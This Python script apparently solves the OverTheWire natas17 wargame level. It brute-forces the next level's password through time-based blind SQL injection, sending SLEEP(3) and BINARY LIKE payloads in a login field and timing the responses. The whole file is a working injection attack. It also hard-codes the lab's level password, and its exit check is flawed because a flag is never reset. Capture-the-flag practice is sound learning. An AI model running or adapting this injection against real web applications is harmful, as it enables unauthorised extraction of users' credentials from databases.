import requests, string, sys
from time import * # type: ignore

ALPHABET = string.ascii_letters + string.digits
URL = "http://natas17.natas.labs.overthewire.org/"
USER = "natas17"
PASS = "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"

def _initialize_sesh():
    session = requests.Session()
    session.auth = (USER, PASS)
    initial_res = session.get(URL)
    if initial_res.status_code == 200:
        print(f"Initial connection to {URL} has been established")
    return session

def main(session : requests.Session):
    print("Now running time bruteforcer...")
    password = ""
    found_char = False
    while (len(password) < 32):
        for char in ALPHABET:
            sys.stdout.write(f"\rTrying char {char}")
            sys.stdout.flush()

            start_time = time()

            # The BINARY operator casts a string into a binary byte string, forcing comparisons to evaluate byte-by-byte so they become strictly case-sensitive.  
            payload = f'natas18" AND BINARY password LIKE "{password}{char}%" AND SLEEP(3) # '
            sys.stdout.write(f"\r{payload}")
            resp = session.post(URL, data = {'username' : payload})
            
            end_time = time()
            diff = end_time - start_time

            if diff > 2.8:
                password += char
                found_char = True
                sys.stdout.write(f"\r New char found! Pass so far is {password}".ljust(1000) + "\n")
                break
        if not found_char:
            print(f"No new chars found... exiting with current pass {password}")
            break
    
    return password


if __name__ == "__main__":
    sesh = _initialize_sesh()
    print(main(sesh))   
